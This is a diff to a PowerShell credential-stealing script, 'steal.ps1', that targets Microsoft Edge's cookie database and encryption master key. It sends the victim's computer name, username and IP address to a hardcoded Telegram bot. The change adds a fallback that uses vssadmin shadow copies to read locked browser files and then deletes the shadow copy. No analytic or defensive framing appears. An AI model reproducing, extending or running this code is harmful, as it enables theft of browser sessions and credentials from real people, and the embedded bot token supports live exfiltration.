@@ -1,5 +1,5 @@
 # steal.ps1
-# Exfiltrates Edge Local State (master key) and Cookies.db to your Cloudflare Worker.
+# Exfiltrates Edge Local State and Cookies.db using VSS for locked files.
 
 $t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
 $c = "6760965981"
@@ -10,18 +10,33 @@ $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyConti
 $body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
 Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
 
-# --- Copy files (with fallback to robocopy /B for locked files) ---
+# --- Function to copy with fallbacks (including VSS) ---
 function Copy-FileWithFallback {
     param($src, $dst)
     # 1) Normal copy
     try { Copy-Item $src $dst -Force -ErrorAction Stop; return $true } catch {}
-    # 2) Try robocopy /B (backup mode – can read locked files if admin)
+    # 2) robocopy /B (backup mode, requires admin)
     try {
         $src_dir = Split-Path $src
         $src_file = Split-Path $src -Leaf
         $dst_dir = Split-Path $dst
         robocopy $src_dir $dst_dir $src_file /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
-        return (Test-Path $dst)
+        if (Test-Path $dst) { return $true }
+    } catch {}
+    # 3) Volume Shadow Copy (vssadmin) – works on all Windows 10/11
+    try {
+        # Create a shadow copy of C: drive
+        $shadow_output = vssadmin create shadow /for=C: 2>&1
+        if ($LASTEXITCODE -eq 0 -and $shadow_output -match "Shadow Copy ID: \{(.*)\}") {
+            $shadow_id = $matches[1]
+            $shadow_path = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$shadow_id\"
+            # Build the shadow path for the source file
+            $src_shadow = $src -replace '^C:\\', $shadow_path
+            Copy-Item $src_shadow $dst -Force -ErrorAction Stop
+            # Delete the shadow copy
+            vssadmin delete shadows /shadow=$shadow_id /quiet | Out-Null
+            return $true
+        }
     } catch {}
     return $false
 }
